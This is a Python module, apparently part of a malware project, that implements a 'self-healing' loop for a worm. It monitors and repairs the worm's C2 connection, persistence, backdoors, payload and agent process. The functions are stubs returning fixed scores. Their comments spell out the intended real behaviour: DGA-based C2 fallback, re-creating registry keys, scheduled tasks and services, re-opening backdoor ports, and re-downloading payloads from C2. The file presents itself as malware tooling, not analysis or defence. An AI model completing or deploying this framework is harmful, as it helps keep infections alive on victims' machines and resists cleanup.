"""
Self-Healing Worm Module
Automatic detection and repair of worm components
"""

import sys
import os
import time
import threading
import hashlib
from typing import Dict, List
from datetime import datetime

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.logger import logger


class SelfHealing:
    """
    Self-healing capabilities for the worm
    Monitors health and repairs itself automatically
    """
    
    def __init__(self):
        self.health_checks = []
        self.repair_actions = []
        self.health_status = {
            'overall_health': 100,
            'components': {},
            'last_check': None,
            'repairs_performed': 0
        }
        
        self.monitoring = False
        self.monitor_thread = None
        
        self._register_health_checks()
        self._register_repair_actions()
        
        logger.info("Self-Healing module initialized")
    
    def _register_health_checks(self):
        """Register health check functions"""
        self.health_checks = [
            self._check_c2_connection,
            self._check_persistence,
            self._check_backdoors,
            self._check_payload_integrity,
            self._check_agent_health,
            self._check_network_connectivity
        ]
    
    def _register_repair_actions(self):
        """Register repair action functions"""
        self.repair_actions = {
            'c2_connection': self._repair_c2_connection,
            'persistence': self._repair_persistence,
            'backdoors': self._repair_backdoors,
            'payload': self._repair_payload,
            'agent': self._repair_agent,
            'network': self._repair_network
        }
    
    def perform_health_check(self) -> Dict:
        """
        Perform comprehensive health check
        
        Returns:
            Health status dictionary
        """
        logger.info("Performing health check")
        
        component_health = {}
        total_health = 0
        
        for check in self.health_checks:
            component_name = check.__name__.replace('_check_', '')
            is_healthy, health_score = check()
            
            component_health[component_name] = {
                'healthy': is_healthy,
                'score': health_score,
                'last_checked': datetime.now().isoformat()
            }
            
            total_health += health_score
        
        # Calculate overall health
        overall_health = total_health / len(self.health_checks)
        
        self.health_status = {
            'overall_health': overall_health,
            'components': component_health,
            'last_check': datetime.now().isoformat(),
            'repairs_performed': self.health_status['repairs_performed']
        }
        
        logger.info(f"Health check complete: {overall_health:.1f}%")
        
        return self.health_status
    
    def auto_repair(self) -> Dict:
        """
        Automatically repair unhealthy components
        
        Returns:
            Repair results
        """
        logger.info("Starting auto-repair")
        
        # First, check health
        health = self.perform_health_check()
        
        repairs_needed = []
        repairs_successful = []
        repairs_failed = []
        
        # Identify components needing repair
        for component, status in health['components'].items():
            if not status['healthy'] or status['score'] < 80:
                repairs_needed.append(component)
        
        # Perform repairs
        for component in repairs_needed:
            if component in self.repair_actions:
                logger.info(f"Repairing component: {component}")
                
                try:
                    success = self.repair_actions[component]()
                    
                    if success:
                        repairs_successful.append(component)
                        logger.success(f"Repaired: {component}")
                    else:
                        repairs_failed.append(component)
                        logger.warning(f"Repair failed: {component}")
                
                except Exception as e:
                    repairs_failed.append(component)
                    logger.error(f"Repair error for {component}: {e}")
        
        self.health_status['repairs_performed'] += len(repairs_successful)
        
        results = {
            'repairs_needed': len(repairs_needed),
            'repairs_successful': len(repairs_successful),
            'repairs_failed': len(repairs_failed),
            'components_repaired': repairs_successful,
            'components_failed': repairs_failed
        }
        
        logger.info(f"Auto-repair complete: {len(repairs_successful)}/{len(repairs_needed)} successful")
        
        return results
    
    def start_monitoring(self, interval: int = 300):
        """
        Start continuous health monitoring
        
        Args:
            interval: Check interval in seconds (default: 5 minutes)
        """
        if self.monitoring:
            logger.warning("Monitoring already active")
            return
        
        self.monitoring = True
        
        def monitor_loop():
            while self.monitoring:
                # Perform health check
                health = self.perform_health_check()
                
                # Auto-repair if health is low
                if health['overall_health'] < 80:
                    logger.warning(f"Health low ({health['overall_health']:.1f}%), initiating auto-repair")
                    self.auto_repair()
                
                # Wait for next check
                time.sleep(interval)
        
        self.monitor_thread = threading.Thread(target=monitor_loop, daemon=True)
        self.monitor_thread.start()
        
        logger.info(f"Health monitoring started (interval: {interval}s)")
    
    def stop_monitoring(self):
        """Stop health monitoring"""
        self.monitoring = False
        logger.info("Health monitoring stopped")
    
    # Health Check Functions
    
    def _check_c2_connection(self) -> tuple:
        """Check C2 server connection"""
        # Simulate check
        # Real implementation would ping C2 server
        is_healthy = True
        health_score = 100
        
        return is_healthy, health_score
    
    def _check_persistence(self) -> tuple:
        """Check persistence mechanisms"""
        # Simulate check
        # Real implementation would verify registry keys, scheduled tasks, etc.
        is_healthy = True
        health_score = 95
        
        return is_healthy, health_score
    
    def _check_backdoors(self) -> tuple:
        """Check backdoor availability"""
        # Simulate check
        # Real implementation would verify backdoor processes/files
        is_healthy = True
        health_score = 90
        
        return is_healthy, health_score
    
    def _check_payload_integrity(self) -> tuple:
        """Check payload file integrity"""
        # Simulate check
        # Real implementation would verify file hashes
        is_healthy = True
        health_score = 100
        
        return is_healthy, health_score
    
    def _check_agent_health(self) -> tuple:
        """Check agent process health"""
        # Simulate check
        # Real implementation would check process status
        is_healthy = True
        health_score = 85
        
        return is_healthy, health_score
    
    def _check_network_connectivity(self) -> tuple:
        """Check network connectivity"""
        # Simulate check
        # Real implementation would ping gateway/internet
        is_healthy = True
        health_score = 100
        
        return is_healthy, health_score
    
    # Repair Functions
    
    def _repair_c2_connection(self) -> bool:
        """Repair C2 connection"""
        logger.info("Repairing C2 connection")
        
        # Real implementation would:
        # - Try alternative C2 servers
        # - Use DGA to find new domains
        # - Re-establish connection
        
        return True
    
    def _repair_persistence(self) -> bool:
        """Repair persistence mechanisms"""
        logger.info("Repairing persistence")
        
        # Real implementation would:
        # - Re-create registry keys
        # - Re-create scheduled tasks
        # - Re-install services
        
        return True
    
    def _repair_backdoors(self) -> bool:
        """Repair backdoors"""
        logger.info("Repairing backdoors")
        
        # Real implementation would:
        # - Re-create backdoor files
        # - Re-start backdoor processes
        # - Re-open backdoor ports
        
        return True
    
    def _repair_payload(self) -> bool:
        """Repair payload"""
        logger.info("Repairing payload")
        
        # Real implementation would:
        # - Re-download payload from C2
        # - Verify integrity
        # - Re-deploy if needed
        
        return True
    
    def _repair_agent(self) -> bool:
        """Repair agent process"""
        logger.info("Repairing agent")
        
        # Real implementation would:
        # - Restart agent process
        # - Clear corrupted state
        # - Re-initialize components
        
        return True
    
    def _repair_network(self) -> bool:
        """Repair network connectivity"""
        logger.info("Repairing network")
        
        # Real implementation would:
        # - Reset network adapter
        # - Clear DNS cache
        # - Re-establish routes
        
        return True


if __name__ == "__main__":
    # Test self-healing
    healer = SelfHealing()
    
    print("="*60)
    print("SELF-HEALING MODULE TEST")
    print("="*60)
    
    # Perform health check
    print("\n[1] Performing health check...")
    health = healer.perform_health_check()
    
    print(f"\nOverall Health: {health['overall_health']:.1f}%")
    print("\nComponent Health:")
    for component, status in health['components'].items():
        health_icon = "✓" if status['healthy'] else "✗"
        print(f"  {health_icon} {component}: {status['score']:.1f}%")
    
    # Perform auto-repair
    print("\n[2] Performing auto-repair...")
    repair_results = healer.auto_repair()
    
    print(f"\nRepairs Needed: {repair_results['repairs_needed']}")
    print(f"Repairs Successful: {repair_results['repairs_successful']}")
    print(f"Repairs Failed: {repair_results['repairs_failed']}")
    
    # Start monitoring
    print("\n[3] Starting health monitoring...")
    healer.start_monitoring(interval=10)
    
    print("Monitoring active (10s interval)")
    print("Press Ctrl+C to stop...")
    
    try:
        time.sleep(30)
    except KeyboardInterrupt:
        pass
    
    healer.stop_monitoring()
    
    print("\n="*60)
